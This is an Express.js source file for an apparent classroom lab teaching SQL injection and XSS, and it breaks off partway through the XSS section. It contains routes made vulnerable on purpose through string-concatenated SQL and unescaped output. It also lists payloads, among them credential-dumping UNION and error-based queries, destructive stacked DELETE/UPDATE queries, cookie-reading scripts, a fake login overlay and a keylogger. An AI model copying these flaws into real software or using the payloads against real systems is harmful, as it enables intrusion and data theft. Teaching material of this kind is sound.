require('dotenv').config(); // 1º LUGAR OBRIGATÓRIO: Carrega as variáveis do arquivo .env antes de tudo!
const express = require('express');
const { Pool } = require('pg');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Pega as peças separadas do .env (Locais)
const dbId = process.env.DB_ID;
const dbSenha = process.env.DB_SENHA;

// Monta a string final injetando as variáveis do jeito certo ou usa a variável nativa do Render se existir
const connectionString = process.env.DATABASE_URL || `postgresql://postgres.${dbId}:${dbSenha}@aws-1-us-west-2.pooler.supabase.com:6543/postgres?sslmode=require&uselibpqcompat=true`;

if (!connectionString || (!process.env.DATABASE_URL && (!dbId || !dbSenha))) {
  console.error("❌ ERRO: Configurações do banco de dados não encontradas no .env!");
  process.exit(1);
}

const pool = new Pool({
  connectionString: connectionString,
  ssl: {
    rejectUnauthorized: false // Obrigatório para o SSL do Supabase
  }
});

// Testar a conexão com o banco de dados na inicialização
pool.connect((err, client, release) => {
  if (err) {
    return console.error('❌ Erro crítico ao conectar no Supabase:', err.stack);
  }
  console.log('🚀 Sucesso: Conectado com segurança ao PostgreSQL do Supabase!');
  release();
});

// DADOS ORIGINAIS DO LABORATÓRIO (usados pelo botão de Reset para repor o banco)
const SEED_PRODUTOS = [
  { nome: 'Curso de QA Manual: Da Teoria ao Primeiro Bug', preco: 197.00, oculto: false },
  { nome: 'Curso de Automação com Cypress (Do Zero ao Pipeline)', preco: 297.00, oculto: false },
  { nome: 'Caneca de Porcelana: "Roda na Minha Máquina"', preco: 39.90, oculto: false },
  { nome: 'Café em Grãos Extra Forte para Devs (Pacote 1kg)', preco: 49.90, oculto: false },
  { nome: 'Gabarito Oficial da Prova de Engenharia de Software', preco: 999.00, oculto: true },
  { nome: 'Mouse Gamer Ergonômico com RGB (Mais 50 FPS de Código)', preco: 159.90, oculto: false },
  { nome: 'Teclado Mecânico Switch Blue (Para irritar o pessoal do lado)', preco: 249.90, oculto: false },
  { nome: 'E-book: 101 Desculpas Padrão para Quando o Sistema Cai', preco: 19.90, oculto: false },
  { nome: 'Acesso de Administrador Root no Servidor de Produção', preco: 9999.00, oculto: true },
  { nome: 'Licença Anual Individual - IntelliJ IDEA Pro', preco: 349.00, oculto: false },
  { nome: 'Monitor Ultrawide 34 Pol (Para ver logs gigantes sem dar scroll)', preco: 1899.00, oculto: false },
  { nome: 'Camiseta: "Fiz o Commit na Sexta-Feira às 17h59"', preco: 59.90, oculto: false },
  { nome: 'Script em Python que automatiza 90% do seu trabalho diário', preco: 79.90, oculto: false },
  { nome: 'Planilha com todos os salários e cargos da diretoria da empresa', preco: 4999.00, oculto: true },
  { nome: 'Hub USB-C 8 em 1 (Para aguentar todos os adaptadores do Mac)', preco: 89.90, oculto: false },
  { nome: 'Livro Físico: Clean Code (Para deixar na mesa e fingir que leu)', preco: 99.90, oculto: false },
  { nome: 'Almofada Ergonômica para Cadeira de Escritório (Adeus dor nas costas)', preco: 129.90, oculto: false },
  { nome: 'Backup Completo do Banco de Dados de Produção (.sql de 50GB)', preco: 14999.00, oculto: true },
  { nome: 'Garrafa Térmica Inteligente com Mostrador de Temperatura (500ml)', preco: 69.90, oculto: false },
  { nome: 'Curso Avançado: Engenharia de Prompt para Alavancar Carreira', preco: 397.00, oculto: false },
  { nome: 'Produto Normal', preco: 29.90, oculto: false },
  { nome: 'Produto Secreto', preco: 1999.00, oculto: true }
];

const SEED_USUARIOS = [
  { email: 'admin@nosso-lab.com', senha: 'SenhaSuperSecreta123', perfil: 'admin' },
  { email: 'admin@lab.com', senha: '123456', perfil: 'admin' },
  { email: 'user@lab.com', senha: 'senha', perfil: 'user' }
];

function escapeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

// 0. HUB DE SELEÇÃO DE LABORATÓRIOS
app.get('/', (req, res) => {
    res.send(`
        <div style="font-family: sans-serif; max-width: 800px; margin: 60px auto; padding: 20px;">
            <div style="text-align: center; padding: 30px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border-radius: 8px; margin-bottom: 40px;">
                <h1 style="margin: 0; font-size: 32px;">🔬 Laboratórios de Segurança</h1>
                <p style="margin: 10px 0 0 0; font-size: 18px; opacity: 0.9;">Escolha o laboratório da aula de hoje</p>
            </div>

            <div style="display: flex; gap: 20px; flex-wrap: wrap;">
                <a href="/sqli" style="flex: 1; min-width: 280px; text-decoration: none; display: block; background: white; border: 2px solid #667eea; border-radius: 8px; padding: 30px; text-align: center; color: #333; box-shadow: 0 4px 6px rgba(0,0,0,0.1); transition: transform 0.2s;">
                    <div style="font-size: 48px;">💉</div>
                    <h2 style="margin: 10px 0 5px 0; color: #667eea;">SQL Injection</h2>
                    <p style="color: #666; font-size: 14px;">Login bypass, UNION SELECT, blind injection e mais 10 testes práticos.</p>
                </a>
                <a href="/xss" style="flex: 1; min-width: 280px; text-decoration: none; display: block; background: white; border: 2px solid #28a745; border-radius: 8px; padding: 30px; text-align: center; color: #333; box-shadow: 0 4px 6px rgba(0,0,0,0.1); transition: transform 0.2s;">
                    <div style="font-size: 48px;">🧪</div>
                    <h2 style="margin: 10px 0 5px 0; color: #28a745;">Cross-Site Scripting (XSS)</h2>
                    <p style="color: #666; font-size: 14px;">XSS Refletido na busca e XSS Armazenado no mural de comentários.</p>
                </a>
            </div>

            <div style="text-align: center; margin-top: 30px; color: #999; font-size: 12px;">
                <p>⚠️ <strong>Aviso:</strong> Estes laboratórios são fornecidos apenas para fins educacionais.<br>
                Não use estas técnicas em ambientes de produção sem autorização!</p>
            </div>
        </div>
    `);
});

// 1. TELA DE LOGIN (FRONT-END EMBUTIDO)
app.get('/sqli', (req, res) => {
    // Permite pré-preencher o campo de e-mail (usado pelo botão "Ir para o Login" do teste 1 no dashboard)
    const emailPrefill = escapeHtml(req.query.email || '');

    res.send(`
        <div style="font-family: sans-serif; max-width: 800px; margin: 60px auto; padding: 20px;">
            <!-- CABEÇALHO -->
            <div style="text-align: center; padding: 30px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border-radius: 8px; margin-bottom: 40px;">
                <h1 style="margin: 0; font-size: 32px;">🔬 Laboratório de Práticas</h1>
                <p style="margin: 10px 0 0 0; font-size: 18px; opacity: 0.9;">SQL Injection - Aula Prática de Segurança</p>
            </div>

            <!-- INSTRUÇÕES -->
            <div style="background: #f0f8ff; border-left: 4px solid #667eea; padding: 20px; margin-bottom: 30px; border-radius: 4px;">
                <h2 style="color: #333; margin-top: 0;">📚 Bem-vindo ao Laboratório!</h2>
                <p style="color: #555; line-height: 1.6;">
                    Este laboratório foi criado para fins educacionais, permitindo que você explore e entenda conceitos de
                    <strong>SQL Injection (SQLi)</strong> em um ambiente controlado e seguro.
                </p>
                <h3 style="color: #667eea; margin: 20px 0 10px 0;">🎯 Como Usar:</h3>
                <ol style="color: #555; line-height: 1.8; margin: 10px 0;">
                    <li><strong>Faça login</strong> usando um payload SQL Injection (veja exemplos abaixo)</li>
                    <li><strong>Acesse a dashboard</strong> com o menu de 10 testes diferentes</li>
                    <li><strong>Explore os ataques</strong> e veja como afetam o banco de dados</li>
                    <li><strong>Aprenda a se defender</strong> contra essas vulnerabilidades</li>
                </ol>
            </div>

            <!-- PAYLOADS DE EXEMPLO -->
            <div style="background: #fffbea; border-left: 4px solid #ffc107; padding: 20px; margin-bottom: 30px; border-radius: 4px;">
                <h3 style="color: #ff9800; margin-top: 0;">💡 Payloads para Testar:</h3>
                <p style="color: #555; margin: 10px 0;"><strong>Login Bypass (Mais fácil):</strong></p>
                <code style="background: #fff; padding: 10px; border-radius: 4px; display: block; overflow-x: auto; border: 1px solid #ddd;">
                    Email: <strong>' OR '1'='1</strong><br>
                    Senha: <strong>qualquer coisa</strong>
                </code>

                <p style="color: #555; margin: 20px 0 10px 0;"><strong>Outras opções:</strong></p>
                <code style="background: #fff; padding: 10px; border-radius: 4px; display: block; overflow-x: auto; border: 1px solid #ddd;">
                    Email: <strong>' OR 1=1--</strong><br>
                    Email: <strong>admin' --</strong><br>
                    Email: <strong>' OR '1'='1' /*</strong>
                </code>
            </div>

            <!-- FORMULÁRIO DE LOGIN -->
            <div style="background: white; padding: 30px; border: 2px solid #667eea; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
                <h2 style="text-align: center; color: #333; margin-top: 0;">🔐 Login</h2>
                <form action="/login" method="POST">
                    <label style="font-weight: bold; color: #333; display: block; margin-bottom: 8px;">📧 E-mail:</label>
                    <input type="text" name="email" value="${emailPrefill}" style="width:100%; padding:12px; margin-bottom: 20px; border: 1px solid #ddd; border-radius:4px; box-sizing: border-box; font-size: 14px;" placeholder="Exemplo: ' OR '1'='1" required><br>

                    <label style="font-weight: bold; color: #333; display: block; margin-bottom: 8px;">🔒 Senha:</label>
                    <input type="password" name="senha" style="width:100%; padding:12px; margin-bottom: 20px; border: 1px solid #ddd; border-radius:4px; box-sizing: border-box; font-size: 14px;" placeholder="Digite qualquer coisa" required><br>

                    <button type="submit" style="width:100%; padding:14px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color:white; border:none; border-radius:4px; font-size:16px; cursor:pointer; font-weight: bold; transition: transform 0.2s;">🚀 Entrar no Laboratório</button>
                </form>
            </div>

            <!-- RODAPÉ -->
            <div style="text-align: center; margin-top: 30px; color: #999; font-size: 12px;">
                <p>⚠️ <strong>Aviso:</strong> Este laboratório é fornecido apenas para fins educacionais.<br>
                Não use técnicas de SQLi em ambientes de produção sem autorização!</p>
            </div>
        </div>
    `);
});

// 2. ROTA DE LOGIN VULNERÁVEL (Ataque de desvio/Bypass)
app.post('/login', async (req, res) => {
    const { email, senha } = req.body;

    // O ERRO INTENCIONAL: Interpolação direta que permite fechar a aspa e anular a query
    const query = `SELECT * FROM usuarios WHERE email = '${email}' AND senha = '${senha}'`;

    console.log(`\n🔍 Query executada no banco:\n${query}\n`);

    try {
        const resultado = await pool.query(query);

        if (resultado.rows.length > 0) {
            // Redireciona para o dashboard ao invés de mostrar apenas "BINGO"
            res.send(`
                <div style="font-family: sans-serif; text-align:center; margin-top:100px;">
                    <h1 style="color: green;">🔓 BINGO! Autenticação Ignorada!</h1>
                    <p style="font-size: 18px;">Logado como: <strong>${resultado.rows[0].email}</strong></p>
                    <p style="font-size: 18px;">Perfil no Sistema: <strong>${resultado.rows[0].perfil}</strong></p>
                    <br>
                    <a href="/dashboard" style="padding:12px 25px; background:#28a745; color:white; text-decoration:none; border-radius:4px; font-weight:bold;">🛒 Ir para a Loja</a>
                    <a href="/sqli" style="padding:12px 25px; margin-left:10px; background:#6c757d; color:white; text-decoration:none; border-radius:4px;">Voltar</a>
                </div>
            `);
        } else {
            res.send(`
                <div style="font-family: sans-serif; text-align:center; margin-top:100px;">
                    <h1 style="color: red;">❌ Erro de Autenticação</h1>
                    <p style="font-size: 18px;">Usuário ou senha inválidos.</p>
                    <br>
                    <a href="/sqli" style="padding:10px 20px; background:#007bff; color:white; text-decoration:none; border-radius:4px;">Tentar novamente</a>
                </div>
            `);
        }
    } catch (error) {
        res.status(500).send(`
            <div style="font-family: monospace; background:#f8d7da; padding:30px; margin:50px auto; max-width: 800px; border-radius:8px; border: 1px solid #f5c6cb;">
                <h3 style="color: #721c24; margin-top:0;">💥 Banco de Dados Quebrou! (Erro de Sintaxe SQL)</h3>
                <p><strong>Mensagem do Postgres:</strong> <span style="color:red;">${error.message}</span></p>
                <p><strong>Query que causou o erro:</strong></p>
                <pre style="background:#fff; padding:15px; border:1px solid #ddd; overflow-x:auto;"><code>${query}</code></pre>
                <br>
                <a href="/sqli" style="padding:10px 20px; background:#721c24; color:white; text-decoration:none; border-radius:4px;">Voltar</a>
            </div>
        `);
    }
});

// 3. DASHBOARD COM MENU LATERAL DE 10 TESTES SQLi (acordeão: clicar abre/fecha sem recarregar a página)
const testes = [
    { id: 'test1', nome: '1️⃣ Error-based Injection', payload: "' AND 1=CAST((SELECT string_agg(email||':'||senha, ', ') FROM usuarios) AS INT)--", descricao: 'Vaza dados através da mensagem de erro do banco' },
    { id: 'test2', nome: '2️⃣ UNION SELECT', payload: "' UNION SELECT id, email || ':' || senha, 0, false FROM usuarios--", descricao: 'Extrai dados de outra tabela' },
    { id: 'test3', nome: '3️⃣ ORDER BY', payload: "' ORDER BY 4--", descricao: 'Descobre número de colunas' },
    { id: 'test4', nome: '4️⃣ Comentários', payload: "%' OR oculto=true--", descricao: 'Ignora o resto do filtro' },
    { id: 'test5', nome: '5️⃣ Stacked Queries', payload: "'; DELETE FROM produtos WHERE oculto=true;--", descricao: 'Executa múltiplas queries' },
    { id: 'test6', nome: '6️⃣ Time-based Blind', payload: "' AND 1=(SELECT 1 FROM pg_sleep(3))--", descricao: 'Extrai informação por tempo de resposta' },
    { id: 'test7', nome: '7️⃣ Boolean Blind', payload: "' AND 1=1--", descricao: 'Anula o filtro com uma condição sempre verdadeira' },
    { id: 'test8', nome: '8️⃣ DELETE Injection', payload: "'; DELETE FROM produtos WHERE id>0;--", descricao: 'Deleta dados da tabela' },
    { id: 'test9', nome: '9️⃣ UPDATE Injection', payload: "'; UPDATE produtos SET preco=0;--", descricao: 'Modifica dados da tabela' },
    { id: 'test10', nome: '🔟 Information Schema', payload: "' UNION SELECT 1, table_name || '.' || column_name, 1, false FROM information_schema.columns WHERE table_schema='public'--", descricao: 'Mapeia a estrutura do banco' }
];

app.get('/dashboard', async (req, res) => {
    // Buscar todos os produtos (sem filtro)
    let produtosHtml = '';
    try {
        const resultado = await pool.query('SELECT * FROM produtos ORDER BY id');
        resultado.rows.forEach(prod => {
            const estiloLinha = prod.oculto ? 'background: #fff3cd;' : '';
            const statusOculto = prod.oculto ? '🔒 OCULTO' : '✅ Visível';
            produtosHtml += `
                <tr style="${estiloLinha}">
                    <td style="padding:12px; border:1px solid #ddd;">${prod.nome}</td>
                    <td style="padding:12px; border:1px solid #ddd;">R$ ${prod.preco}</td>
                    <td style="padding:12px; border:1px solid #ddd; text-align:center;">${statusOculto}</td>
                </tr>
            `;
        });
    } catch (e) {
        produtosHtml = `<tr><td colspan="3" style="padding:20px; text-align:center; color:#d9534f;">❌ Erro ao carregar: ${e.message}</td></tr>`;
    }

    // Gerar menu lateral em acordeão: cada item tem um painel (rolldown) que abre embaixo dele
    let menu = '';
    testes.forEach(teste => {
        const payloadHtml = escapeHtml(teste.payload);

        let aviso = '';
        if (teste.id === 'test5' || teste.id === 'test8' || teste.id === 'test9') {
            aviso = '<div style="background:#f8d7da; border-left:4px solid #dc3545; padding:10px; margin-bottom:10px; border-radius:4px; color:#721c24; font-size:12px;"><strong>⚠️ Atenção:</strong> Este teste altera os dados do banco para TODOS os alunos. Depois de testar, favor apertar o botão "🔄 Resetar Dados do Laboratório" para colocar os itens novamente.</div>';
        }

        menu += `
            <div class="teste-item">
                <a href="javascript:void(0)" class="teste-link" id="link-${teste.id}" onclick="toggleTeste('${teste.id}')">
                    <strong style="font-size:13px;">${teste.nome}</strong><br>
                    <small style="opacity:0.7; font-size:11px;">${teste.descricao}</small>
                </a>
                <div class="teste-panel" id="panel-${teste.id}">
                    ${aviso}
                    <p style="margin:6px 0; color:#004085; font-size:12px;"><strong>Payload:</strong></p>
                    <code style="background:white; padding:8px; border-radius:4px; display:block; word-break:break-all; font-size:11px; border:1px solid #0056b3;">${payloadHtml}</code>
                    <p style="margin:8px 0 0 0; color:#856404; font-size:11px;">✋ Cole isso no campo de busca, ao lado, e clique em "Buscar".</p>
                </div>
            </div>
        `;
    });

    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <title>Laboratório SQLi - Dashboard</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { font-family: sans-serif; background: white; }
                .container { display: flex; height: 100vh; }
                .sidebar { width: 280px; background: #f5f5f5; padding: 20px; overflow-y: auto; border-right: 2px solid #ddd; }
                .main { flex: 1; padding: 30px; overflow-y: auto; background: white; }
                .sidebar h2 { margin-top: 0; margin-bottom: 10px; color: #333; font-size: 16px; }
                .sidebar p { font-size: 12px; color: #666; margin-bottom: 15px; }
                .teste-item { margin: 8px 0; }
                .teste-link { display:block; padding:12px; border-radius:4px; text-decoration:none; background:#f9f9f9; border:1px solid #ddd; color:#333; cursor:pointer; transition:all 0.2s; }
                .teste-link.active { background:#007bff; color:white; border:2px solid #0056b3; }
                .teste-panel { display:none; background:#e7f3ff; padding:12px; border-radius:4px; margin-top:6px; border-left:4px solid #007bff; }
                .teste-panel.open { display:block; }
                .reset-btn { display:block; width:100%; text-align:center; padding:12px; background:#fd7e14; color:white; border:none; border-radius:4px; margin-top:20px; font-weight:bold; cursor:pointer; font-size:13px; }
                .search-area { margin-bottom: 25px; }
                .search-area input { width: 100%; padding: 12px; border: 2px solid #007bff; border-radius: 4px; font-size: 14px; }
                .search-area button { width: 100%; padding: 10px; margin-top: 10px; background: #28a745; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
                .products-table { width: 100%; border-collapse: collapse; margin-top: 10px; }
                .products-table th { background: #f2f2f2; padding: 12px; border: 1px solid #ddd; text-align: left; font-weight: bold; }
                .products-table td { padding: 12px; border: 1px solid #ddd; }
                .logout { display: block; text-align: center; padding: 10px; background: #dc3545; color: white; text-decoration: none; border-radius: 4px; margin-top: 10px; }
            </style>
        </head>
        <body>
            <div class="container">
                <!-- SIDEBAR -->
                <div class="sidebar">
                    <h2>🔬 10 Testes SQLi</h2>
                    <p>Clique em um teste para ver o payload (abre embaixo do item, fechando o anterior)</p>
                    ${menu}
                    <button class="reset-btn" onclick="resetarDados()">🔄 Resetar Dados do Laboratório</button>
                    <a href="/sqli" class="logout">🚪 Logout</a>
                </div>

                <!-- MAIN CONTENT -->
                <div class="main">
                    <h1 style="margin-bottom: 20px; color: #333;">🛒 Loja de Produtos</h1>

                    <!-- CAMPO DE BUSCA -->
                    <div class="search-area">
                        <input type="text" id="busca" placeholder="Digite aqui para buscar produtos... ou insira um payload SQLi!" value="">
                        <button onclick="buscarProdutos()">🔍 Buscar</button>
                    </div>

                    <!-- TABELA DE PRODUTOS -->
                    <table class="products-table">
                        <thead>
                            <tr>
                                <th>Produto</th>
                                <th>Preço</th>
                                <th>Status</th>
                            </tr>
                        </thead>
                        <tbody id="produtos">
                            ${produtosHtml}
                        </tbody>
                    </table>
                </div>
            </div>

            <script>
            let testeAberto = null;

            function toggleTeste(id) {
                const painelNovo = document.getElementById('panel-' + id);
                const linkNovo = document.getElementById('link-' + id);
                const reabrindoMesmo = testeAberto === id;

                if (testeAberto) {
                    document.getElementById('panel-' + testeAberto).classList.remove('open');
                    document.getElementById('link-' + testeAberto).classList.remove('active');
                }

                if (reabrindoMesmo) {
                    testeAberto = null;
                } else {
                    painelNovo.classList.add('open');
                    linkNovo.classList.add('active');
                    testeAberto = id;
                }
            }

            async function executarBusca(payload) {
                try {
                    const response = await fetch('/test-payload', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ payload: payload })
                    });

                    const resultado = await response.json();
                    let html = '';

                    if (resultado.sucesso) {
                        if (resultado.dados.length === 0) {
                            html = '<tr><td colspan="3" style="text-align:center; padding:20px; color:#999;">Nenhum resultado encontrado</td></tr>';
                        } else {
                            resultado.dados.forEach(prod => {
                                const estiloLinha = prod.oculto ? 'background: #fff3cd;' : '';
                                const statusOculto = prod.oculto ? '🔒 OCULTO' : '✅ Visível';
                                html += '<tr style="' + estiloLinha + '">' +
                                        '<td>' + prod.nome + '</td>' +
                                        '<td>R$ ' + prod.preco + '</td>' +
                                        '<td style="text-align:center;">' + statusOculto + '</td>' +
                                        '</tr>';
                            });
                        }
                    } else {
                        html = '<tr><td colspan="3" style="padding:20px;"><div style="background:#f8d7da; color:#721c24; padding:10px; border-radius:4px;"><strong>💥 Erro SQL:</strong> ' + resultado.erro + '<br><small>Query: ' + resultado.query + '</small></div></td></tr>';
                    }

                    document.getElementById('produtos').innerHTML = html;
                } catch (err) {
                    document.getElementById('produtos').innerHTML = '<tr><td colspan="3" style="padding:20px; color:#d9534f;">❌ Erro: ' + err.message + '</td></tr>';
                }
            }

            function buscarProdutos() {
                executarBusca(document.getElementById('busca').value);
            }

            async function resetarDados() {
                if (!confirm('⚠️ Isso vai restaurar produtos e usuários para os dados originais, afetando TODOS os alunos conectados agora. Continuar?')) {
                    return;
                }
                try {
                    const response = await fetch('/reset', { method: 'POST' });
                    const resultado = await response.json();
                    alert(resultado.mensagem || resultado.erro);
                    document.getElementById('busca').value = '';
                    executarBusca('');
                } catch (err) {
                    alert('❌ Erro ao resetar: ' + err.message);
                }
            }
            </script>
        </body>
        </html>
    `);
});

// 4. ROTA DE TESTE INTERATIVO (Para executar payloads na dashboard)
app.post('/test-payload', async (req, res) => {
    const { payload } = req.body;

    if (payload === undefined || payload === null) {
        return res.json({ sucesso: false, erro: 'Payload é obrigatório', query: '' });
    }

    // O ERRO INTENCIONAL: Concatenação direta sem sanitização
    const query = `SELECT * FROM produtos WHERE nome LIKE '%${payload}%' AND oculto = false`;

    try {
        let resultado = await pool.query(query);

        // Quando o payload injeta múltiplas instruções (stacked queries), o driver
        // retorna um array com um resultado por instrução: usamos o último.
        if (Array.isArray(resultado)) {
            resultado = resultado[resultado.length - 1];
        }

        res.json({
            sucesso: true,
            query: query,
            linhas: resultado.rowCount,
            dados: (resultado.rows || []).slice(0, 10) // Limitar a 10 linhas
        });
    } catch (error) {
        res.json({
            sucesso: false,
            query: query,
            erro: error.message,
            dica: '💡 Erro de sintaxe SQL - Pode ser que o payload funcionou!'
        });
    }
});

// 5. ROTA PARA RESETAR OS DADOS DO LABORATÓRIO (restaura produtos e usuários originais)
app.post('/reset', async (req, res) => {
    const client = await pool.connect();
    try {
        await client.query('BEGIN');

        await client.query('DELETE FROM produtos');
        await client.query('ALTER SEQUENCE produtos_id_seq RESTART WITH 1');
        for (const p of SEED_PRODUTOS) {
            await client.query('INSERT INTO produtos (nome, preco, oculto) VALUES ($1, $2, $3)', [p.nome, p.preco, p.oculto]);
        }

        await client.query('DELETE FROM usuarios');
        await client.query('ALTER SEQUENCE usuarios_id_seq RESTART WITH 1');
        for (const u of SEED_USUARIOS) {
            await client.query('INSERT INTO usuarios (email, senha, perfil) VALUES ($1, $2, $3)', [u.email, u.senha, u.perfil]);
        }

        await client.query('COMMIT');
        res.json({ sucesso: true, mensagem: '✅ Dados resetados com sucesso! Produtos e usuários voltaram ao estado original.' });
    } catch (error) {
        await client.query('ROLLBACK');
        res.status(500).json({ sucesso: false, erro: error.message });
    } finally {
        client.release();
    }
});

// 6. ROTA DE BUSCA VULNERÁVEL (Ataque para extrair dados/exibir ocultos)

app.get('/produtos', async (req, res) => {
    const termoBusca = req.query.busca || '';

    // O ERRO INTENCIONAL: Concatenação sem sanitização anulando a lógica do "oculto = false"
    const query = `SELECT * FROM produtos WHERE nome LIKE '%${termoBusca}%' AND oculto = false`;

    console.log(`\n🔍 Query de Busca executada:\n${query}\n`);

    try {
        const resultado = await pool.query(query);

        let linhasTabela = '';
        resultado.rows.forEach(prod => {
            const estiloLinha = prod.oculto ? 'background: #fff3cd; font-weight: bold;' : '';
            linhasTabela += `
                <tr style="${estiloLinha}">
                    <td style="padding:10px; border:1px solid #ddd;">${prod.nome}</td>
                    <td style="padding:10px; border:1px solid #ddd;">R$ ${prod.preco}</td>
                    <td style="padding:10px; border:1px solid #ddd; color: ${prod.oculto ? 'red' : 'green'};">${prod.oculto ? '⚠️ SIM (CONFIDENCIAL)' : 'Não'}</td>
                </tr>
            `;
        });

        res.send(`
            <div style="font-family: sans-serif; max-width: 900px; margin: 40px auto; padding: 20px;">
                <h2>E-Commerce do Lab - Busca de Produtos</h2>
                <p style="color:#666;">O sistema esconde os produtos ocultos da diretoria automaticamente... Será?</p>

                <form action="/produtos" method="GET" style="margin-bottom: 20px; display: flex; gap: 10px;">
                    <input type="text" name="busca" value="${termoBusca}" style="flex: 1; padding:12px; border: 1px solid #ccc; border-radius:4px;" placeholder="Pesquisar produto no catálogo...">
                    <button type="submit" style="padding:12px 25px; background:#28a745; color:white; border:none; border-radius:4px; font-weight:bold; cursor:pointer;">Buscar</button>
                </form>

                <table style="width:100%; border-collapse: collapse; box-shadow: 0 2px 4px rgba(0,0,0,0.05);">
                    <thead>
                        <tr style="background:#f2f2f2; border-bottom: 2px solid #ddd;">
                            <th style="padding:12px; border:1px solid #ddd; text-align:left;">Nome do Produto</th>
                            <th style="padding:12px; border:1px solid #ddd; text-align:left;">Preço</th>
                            <th style="padding:12px; border:1px solid #ddd; text-align:left;">Restrito/Oculto?</th>
                        </tr>
                    </thead>
                    <tbody>
                        ${linhasTabela || '<tr><td colspan="3" style="padding:20px; text-align:center; color:#999;">Nenhum produto encontrado.</td></tr>'}
                    </tbody>
                </table>
                <br>
                <a href="/sqli" style="color:#007bff; text-decoration:none;">← Voltar para o Login</a>
            </div>
        `);
    } catch (error) {
        res.status(500).send(`
            <div style="font-family: monospace; background:#f8d7da; padding:30px; margin:50px auto; max-width: 800px; border-radius:8px; border: 1px solid #f5c6cb;">
                <h3 style="color: #721c24; margin-top:0;">💥 Erro de Sintaxe SQL na Busca!</h3>
                <p><strong>Mensagem do Postgres:</strong> <span style="color:red;">${error.message}</span></p>
                <p><strong>Query que causou o erro:</strong></p>
                <pre style="background:#fff; padding:15px; border:1px solid #ddd; overflow-x:auto;"><code>${query}</code></pre>
                <br>
                <a href="/produtos" style="padding:10px 20px; background:#721c24; color:white; text-decoration:none; border-radius:4px;">Voltar</a>
            </div>
        `);
    }
});

// ============================================================
// LABORATÓRIO DE XSS (Cross-Site Scripting)
// ============================================================

const SEED_COMENTARIOS = [
    { autor: 'Professor', mensagem: 'Bem-vindo ao Mural do Laboratório! Use os payloads da barra lateral para testar o XSS Armazenado aqui. 🔬' },
    { autor: 'Aluno Teste', mensagem: 'Esse curso está muito bom, aprendendo bastante sobre segurança!' }
];

// 10 testes de XSS para a barra lateral (acordeão, igual ao lab de SQLi)
const testesXss = [
    { id: 'xss1', nome: '1️⃣ Alert Básico', payload: `<script>alert('XSS')</script>`, onde: 'Busca e Mural', descricao: 'O clássico pop-up que prova a execução de JavaScript' },
    { id: 'xss2', nome: '2️⃣ Exibir Cookies', payload: `<script>alert(document.cookie)</script>`, onde: 'Busca e Mural', descricao: 'Mostra que um script injetado pode ler dados sensíveis da página' },
    { id: 'xss3', nome: '3️⃣ Manipulação de DOM (Título)', payload: `<script>document.title = 'Hackeado pelo XSS!'</script>`, onde: 'Busca e Mural', descricao: 'Altera elementos da página sem precisar de pop-up' },
    { id: 'xss4', nome: '4️⃣ Defacement da Página', payload: `<script>document.body.innerHTML = '<h1 style=\"color:red;text-align:center;margin-top:100px;\">💀 Site Hackeado!</h1>'</script>`, onde: 'Mural', descricao: 'Substitui todo o conteúdo visível da página' },
    { id: 'xss5', nome: '5️⃣ Caixa de Login Falsa (Phishing)', payload: `<script>document.body.innerHTML = '<div style="text-align:center;margin-top:100px;font-family:sans-serif;"><h2>⚠️ Sessão expirada. Faça login novamente:</h2><form><input placeholder="Email" style="padding:10px;display:block;margin:10px auto;width:250px;"><input placeholder="Senha" type="password" style="padding:10px;display:block;margin:10px auto;width:250px;"><button style="padding:10px 20px;">Entrar</button></form></div>'</script>`, onde: 'Mural', descricao: 'Engenharia social: simula uma tela de login para roubar credenciais' },
    { id: 'xss6', nome: '6️⃣ IMG com onerror (sem <script>)', payload: `<img src="x" onerror="alert('XSS via atributo de IMG')">`, onde: 'Busca e Mural', descricao: 'Filtros que bloqueiam só a tag <script> não impedem este payload' },
    { id: 'xss7', nome: '7️⃣ SVG com onload', payload: `<svg onload="alert('XSS via SVG')"></svg>`, onde: 'Busca e Mural', descricao: 'Outra forma de executar JS sem usar a tag <script>' },
    { id: 'xss8', nome: '8️⃣ Redirecionamento Malicioso', payload: `<script>alert('Você será redirecionado!'); window.location='https://exemplo.com'</script>`, onde: 'Mural', descricao: 'Simula um redirect para um site de phishing controlado pelo atacante' },
    { id: 'xss9', nome: '9️⃣ Div com Evento onmouseover', payload: `<div onmouseover="alert('XSS ao passar o mouse!')" style="background:#ffeb3b;padding:20px;">Passe o mouse aqui</div>`, onde: 'Mural', descricao: 'XSS que só dispara com interação do usuário (evento de mouse)' },
    { id: 'xss10', nome: '🔟 Keylogger Simples', payload: `<script>document.onkeypress = function(e){ console.log('Tecla digitada: ' + e.key); }</script>`, onde: 'Mural', descricao: 'Captura tudo que a vítima digitar na página depois do comentário ser carregado (veja no Console do navegador)' }
];

function renderMenuXss() {
    let menu = '';
    testesXss.forEach(teste => {
        const payloadHtml = escapeHtml(teste.payload);
        const nomeHtml = escapeHtml(teste.nome);
        const descricaoHtml = escapeHtml(teste.descricao);
        menu += `
            <div class="teste-item">
                <a href="javascript:void(0)" class="teste-link" id="link-${teste.id}" onclick="toggleTesteXss('${teste.id}')">
                    <strong style="font-size:13px;">${nomeHtml}</strong><br>
                    <small style="opacity:0.7; font-size:11px;">${descricaoHtml}</small>
                </a>
                <div class="teste-panel" id="panel-${teste.id}">
                    <p style="margin:6px 0; color:#155724; font-size:12px;"><strong>Onde testar:</strong> ${teste.onde}</p>
                    <code style="background:white; padding:8px; border-radius:4px; display:block; word-break:break-all; font-size:11px; border:1px solid #28a745; white-space:pre-wrap;">${payloadHtml}</code>
                    <p style="margin:8px 0 0 0; color:#856404; font-size:11px;">✋ Copie e cole na busca ou no campo de mensagem do mural.</p>
                </div>
            </div>
        `;
    });
    return menu;
}

const sidebarStyleXss = `
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: sans-serif; background: white; }
    .container { display: flex; min-height: 100vh; }
